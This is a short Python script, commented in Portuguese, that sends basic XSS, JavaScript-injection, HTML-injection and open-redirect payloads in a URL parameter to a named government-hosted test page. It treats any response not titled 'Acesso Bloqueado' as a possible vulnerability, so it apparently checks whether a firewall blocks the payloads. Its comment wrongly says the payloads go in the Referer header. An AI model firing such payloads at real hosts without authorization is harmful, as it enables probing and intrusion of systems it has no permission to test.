import requests
from bs4 import BeautifulSoup

# Configurações iniciais
url_base = "https://sone.codatahml.pb.gov.br/index.php?page=back-button-discussion.php"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}
# Payloads para testar através do cabeçalho HTTP 'Referer'
payloads = {
    'Reflected XSS': "<script>alert('XSS')</script>",
    'JS Injection': "javascript:alert('JS Injection');",
    'HTML Injection': "<h1>HTML Injection</h1>",
    'Unvalidated Redirect': "https://google.com/"
}
# Função para enviar a requisição e verificar a resposta
def enviar_requisicao_e_verificar_resposta(url_completa, tipo_vulnerabilidade, teste_numero):
    resposta_teste = requests.get(url_completa, headers=headers)
    
    # Depurar a resposta
    #depurar_resposta(resposta_teste, teste_numero)

    soup = BeautifulSoup(resposta_teste.text, 'html.parser')
    titulo = soup.find('title').text if soup.find('title') else ''

    print(f"Teste {teste_numero}: Testando '{tipo_vulnerabilidade}'. Título: {titulo[:46]}")
    
    if titulo != "Acesso Bloqueado":
        print(f"Teste #{teste_numero} PASSOU: Vulnerabilidade de '{tipo_vulnerabilidade}' possivelmente encontrada!")
        return 1
    else:
        print(f"Teste #{teste_numero} FALHOU: Acesso bloqueado.")
        return 0

# Função para depurar a resposta
#def depurar_resposta(resposta, teste_numero):
    print(f"\nDetalhes da Resposta do Teste #{teste_numero}:")
    print(f"Código de Status: {resposta.status_code}")
    print("Cabeçalhos da Resposta:")
    for chave, valor in resposta.headers.items():
        print(f"  {chave}: {valor}")
    print(f"Corpo da Resposta: {resposta.text[:500]}...")  # Limitado aos primeiros 500 caracteres para brevidade

# Contadores para os resultados dos testes
total_testes = 0
testes_passaram = 0
testes_falharam = 0

# Realizar os testes
for tipo_vulnerabilidade, payload in payloads.items():
    total_testes += 1
    payload_encoded = requests.utils.quote(payload)
    url_completa = f"{url_base}&xml={payload_encoded}&xml-validator-php-submit-button=Validate+XML"
    resultado_teste = enviar_requisicao_e_verificar_resposta(url_completa, tipo_vulnerabilidade, total_testes)
    if resultado_teste == 1:
        testes_passaram += 1
    else:
        testes_falharam += 1

# Reportar os resultados finais
print(f"\nTotal de Testes: {total_testes}")
print(f"Testes Passaram: {testes_passaram}")
print(f"Testes Falharam: {testes_falharam}")